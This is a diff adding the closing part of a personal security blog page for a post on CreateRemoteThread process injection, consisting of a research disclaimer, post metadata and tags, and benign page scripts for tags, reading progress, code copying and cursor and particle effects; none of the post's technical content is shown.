+        <p style="font-family:'Fira Code',monospace;font-size:12px;color:var(--text-dim);">
+            // All code written and tested in isolated VM environments. For educational and defensive security research only. Never use against systems you do not own.
+        </p>
+
+    </div>
+
+    <footer class="post-footer">
+        <div class="pf-label">// FILED UNDER</div>
+        <div class="pf-tags" id="pf-tags"></div>
+        <a href="../" class="pf-back">back to blog</a>
+    </footer>
+
+</article>
+
+<!-- ── POST META ── edit this block for each post ── -->
+<script src="../posts.js"></script>
+<script>
+const POST_META = {
+    slug:     "basic-process-injection",
+    title:    "Basic Process Injection — CreateRemoteThread Technique",
+    date:     "2026-04-01",
+    readTime: "14 min read",
+    tags:     ["malware-dev", "windows", "internals", "red-team", "shellcode"],
+};
+</script>
+<!-- ── END POST META ── -->
+
+<script>
+/* ── meta injection ── */
+(function() {
+    function formatDate(iso) {
+        return new Date(iso + 'T00:00:00').toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
+    }
+    function tagStyle(tag) {
+        const col = (typeof TAG_COLORS !== 'undefined' && TAG_COLORS[tag]) || '#555870';
+        return `color:${col};border-color:${col}33;background:${col}0d`;
+    }
+    document.getElementById('post-title').textContent  = POST_META.title;
+    document.title = POST_META.title + ' — Piyusha Akash';
+    document.getElementById('pm-date').textContent = formatDate(POST_META.date);
+    document.getElementById('pm-read').textContent = POST_META.readTime;
+    const topTags = document.getElementById('post-tags-top');
+    POST_META.tags.forEach(t => {
+        const s = document.createElement('span');
+        s.className = 'post-tag-top'; s.style.cssText = tagStyle(t); s.textContent = t;
+        topTags.appendChild(s);
+    });
+    const pfTags = document.getElementById('pf-tags');
+    POST_META.tags.forEach(t => {
+        const a = document.createElement('a');
+        a.className = 'pf-tag'; a.href = '../?tag=' + encodeURIComponent(t);
+        a.style.cssText = tagStyle(t); a.textContent = '#' + t;
+        pfTags.appendChild(a);
+    });
+})();
+
+/* ── reading progress ── */
+window.addEventListener('scroll', () => {
+    const d = document.documentElement;
+    document.getElementById('reading-progress').style.width =
+        (d.scrollTop / (d.scrollHeight - d.clientHeight) * 100) + '%';
+});
+
+/* ── copy code ── */
+function copyCode(btn) {
+    const code = btn.closest('.code-wrap').querySelector('code');
+    navigator.clipboard.writeText(code.innerText).then(() => {
+        btn.textContent = 'copied!'; btn.style.color = 'var(--acid)';
+        setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 2000);
+    });
+}
+
+/* ── syntax highlight ── */
+document.addEventListener('DOMContentLoaded', () => { hljs.highlightAll(); });
+
+/* ── cursor ── */
+const cursor = document.getElementById('cursor');
+const ring   = document.getElementById('cursorRing');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove', e => { mx=e.clientX; my=e.clientY; cursor.style.left=mx+'px'; cursor.style.top=my+'px'; });
+(function anim(){ rx+=(mx-rx)*.12; ry+=(my-ry)*.12; ring.style.left=rx+'px'; ring.style.top=ry+'px'; requestAnimationFrame(anim); })();
+document.querySelectorAll('a,button,code').forEach(el => {
+    el.addEventListener('mouseenter', () => { cursor.style.transform='translate(-50%,-50%) scale(2)'; ring.style.transform='translate(-50%,-50%) scale(1.4)'; ring.style.borderColor='rgba(0,255,157,.8)'; });
+    el.addEventListener('mouseleave', () => { cursor.style.transform='translate(-50%,-50%) scale(1)'; ring.style.transform='translate(-50%,-50%) scale(1)'; ring.style.borderColor='rgba(0,255,157,.5)'; });
+});
+
+/* ── particles ── */
+(function(){
+    const canvas=document.getElementById('particles-canvas'), ctx=canvas.getContext('2d');
+    let W,H,P=[];
+    function resize(){ W=canvas.width=window.innerWidth; H=canvas.height=window.innerHeight; }
+    resize(); window.addEventListener('resize',resize);
+    for(let i=0;i<28;i++) P.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.2+.3,dx:(Math.random()-.5)*.22,dy:-(Math.random()*.28+.06),a:Math.random()*.4+.1,p:Math.random()*Math.PI*2});
+    function draw(){
+        ctx.clearRect(0,0,W,H);
+        P.forEach(p=>{ p.p+=.016; const a=p.a*(.6+.4*Math.sin(p.p)); ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fillStyle=`rgba(0,255,157,${a})`; ctx.fill(); p.x+=p.dx; p.y+=p.dy; if(p.y<-5){p.y=H+5;p.x=Math.random()*W;} if(p.x<-5)p.x=W+5; if(p.x>W+5)p.x=-5; });
+        requestAnimationFrame(draw);
+    }
+    draw();
+})();
+</script>
+</body>
+</html>
